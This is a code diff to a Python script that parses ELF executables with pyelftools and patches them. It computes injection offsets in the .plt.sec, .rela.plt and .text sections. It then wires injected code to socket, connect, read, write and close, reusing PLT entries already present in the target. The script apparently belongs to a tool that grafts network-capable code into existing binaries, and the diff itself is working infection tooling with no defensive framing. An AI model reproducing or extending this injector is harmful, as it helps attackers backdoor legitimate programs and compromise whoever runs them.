@@ -81,6 +81,11 @@ def check_duplicate_symbols_and_versions():
             del sym_versions[(symbol_names.index(DYN_SYM_SECTION.get_symbol(i).name))]
             symbol_names.remove(DYN_SYM_SECTION.get_symbol(i).name)
             string_names.remove(DYN_SYM_SECTION.get_symbol(i).name)
+            for j in range(RELA_PLT_SECTION.num_relocations()):
+                if (RELA_PLT_SECTION.get_relocation(j)['r_info_sym'] == i):
+                    PLT_SEC_INDEXES[DYN_SYM_SECTION.get_symbol(i).name] = j
+                    print(PLT_SEC_INDEXES)
+                    
 
 # converts string names into a list of bytes (NULL-terminated)
 def convert_functions_to_str_tab_entry():
@@ -614,6 +619,9 @@ ELF = ELFFile(open(FILE_NAME,'rb'))
 GNU_VERSION_R_SECTION = ELF.get_section_by_name(".gnu.version_r")
 DYN_SYM_SECTION = ELF.get_section_by_name(".dynsym")
 DYN_SYM_NUM_SYMBOLS = DYN_SYM_SECTION.num_symbols()
+RELA_PLT_SECTION = ELF.get_section_by_name(".rela.plt")
+
+PLT_SEC_INDEXES = {}
 
 check_duplicate_symbols_and_versions()
 convert_functions_to_str_tab_entry()
@@ -657,11 +665,11 @@ RELATIVE_TYPE = 8
 RELA_DYN_ADDEND_STRUCT_OFFSET = 16
 
 #.plt.sec
-section = ELF.get_section_by_name(".plt.sec")
-PLT_SEC_INJECT_OFFSET = section['sh_offset'] + section['sh_size']
-PLT_SEC_ENTRY_SIZE = section['sh_entsize']
+PLT_SEC_SECTION = ELF.get_section_by_name(".plt.sec")
+PLT_SEC_INJECT_OFFSET = PLT_SEC_SECTION['sh_offset'] + PLT_SEC_SECTION['sh_size']
+PLT_SEC_ENTRY_SIZE = PLT_SEC_SECTION['sh_entsize']
 PLT_SEC_INJECT_SIZE = len(symbol_names) * PLT_SEC_ENTRY_SIZE
-PLT_SEC_OFFSET = section['sh_offset']
+PLT_SEC_OFFSET = PLT_SEC_SECTION['sh_offset']
 #.plt
 section = ELF.get_section_by_name(".plt")
 PLT_INJECT_OFFSET = section['sh_offset'] + section['sh_size']
@@ -699,7 +707,6 @@ if section is not None:
     SYM_TAB_OFFSET = SYM_TAB_SECTION['sh_offset']
     SYM_TAB_ENTRY_SIZE = SYM_TAB_SECTION['sh_entsize']
 #.rela.plt
-RELA_PLT_SECTION = ELF.get_section_by_name(".rela.plt")
 RELA_PLT_INJECT_OFFSET = RELA_PLT_SECTION['sh_offset'] + RELA_PLT_SECTION['sh_size']
 RELA_PLT_ENTRY_SIZE = RELA_PLT_SECTION['sh_entsize']
 RELA_PLT_INJECT_SIZE = len(symbol_names) * RELA_PLT_ENTRY_SIZE
@@ -759,18 +766,24 @@ def calc_call_operand(plt_sec_index,inject_offset):
     instruction_pointer = calc_new_offset(TEXT_INJECT_OFFSET + inject_offset + size_of_call,text_section_index)
     return 0xffffffff + 1 - abs(plt_entry_location - instruction_pointer)
 
+def calc_call_operand_existing(plt_sec_index,inject_offset):
+    size_of_call = 4
+    plt_entry_location = calc_new_offset(PLT_SEC_OFFSET + plt_sec_index * PLT_SEC_ENTRY_SIZE,plt_sec_section_index)
+    instruction_pointer = calc_new_offset(TEXT_INJECT_OFFSET + inject_offset + size_of_call,text_section_index)
+    return 0xffffffff + 1 - abs(plt_entry_location - instruction_pointer)
+
 plt_sec_section_index = ELF.get_section_index('.plt.sec')
 text_section_index = ELF.get_section_index('.text')
 
-socketPLT = calc_call_operand(4,0xa2)
-memsetPLT1 = calc_call_operand(0,0xce)
-connectPLT = calc_call_operand(3,0x106)
-strlenPLT = calc_call_operand(7,0x11d)
-writePLT =  calc_call_operand(6,0x15e)
-memsetPLT2 = calc_call_operand(0,0x1b0)
-readPLT =   calc_call_operand(2,0x1f5)
-closePLT =  calc_call_operand(1,0x240)
-stack_chk_failPLT = calc_call_operand(5,0x25c)
+socketPLT = calc_call_operand(4,0xa2) if 'socket' in symbol_names else calc_call_operand_existing(PLT_SEC_INDEXES['socket'],0xa2)
+memsetPLT1 = calc_call_operand(0,0xce) if 'memset' in symbol_names else calc_call_operand_existing(PLT_SEC_INDEXES['memset'],0xce)
+connectPLT = calc_call_operand(3,0x106) if 'connect' in symbol_names else calc_call_operand_existing(PLT_SEC_INDEXES['connect'],0x106)
+strlenPLT = calc_call_operand(7,0x11d) if 'strlen' in symbol_names else calc_call_operand_existing(PLT_SEC_INDEXES['strlen'],0x11d)
+writePLT =  calc_call_operand(6,0x15e) if 'write' in symbol_names else calc_call_operand_existing(PLT_SEC_INDEXES['write'],0x15e)
+memsetPLT2 = calc_call_operand(0,0x1b0) if 'memset' in symbol_names else calc_call_operand_existing(PLT_SEC_INDEXES['memset'],0x1b0)
+readPLT =   calc_call_operand(2,0x1f5) if 'read' in symbol_names else calc_call_operand_existing(PLT_SEC_INDEXES['read'],0x1f5)
+closePLT =  calc_call_operand(1,0x240) if 'close' in symbol_names else calc_call_operand_existing(PLT_SEC_INDEXES['close'],0x240)
+stack_chk_failPLT = calc_call_operand(5,0x25c) if '__stack_chk_fail' in symbol_names else calc_call_operand_existing(PLT_SEC_INDEXES['__stack_chk_fail'],0x25c)
 
 call_inject_indices = [0xa2, 0xce, 0x106, 0x11d, 0x15e, 0x1b0, 0x1f5, 0x240, 0x25c, 0x267]
 instruction_pointer = calc_new_offset(TEXT_INJECT_OFFSET + 0x267 + 4,text_section_index)
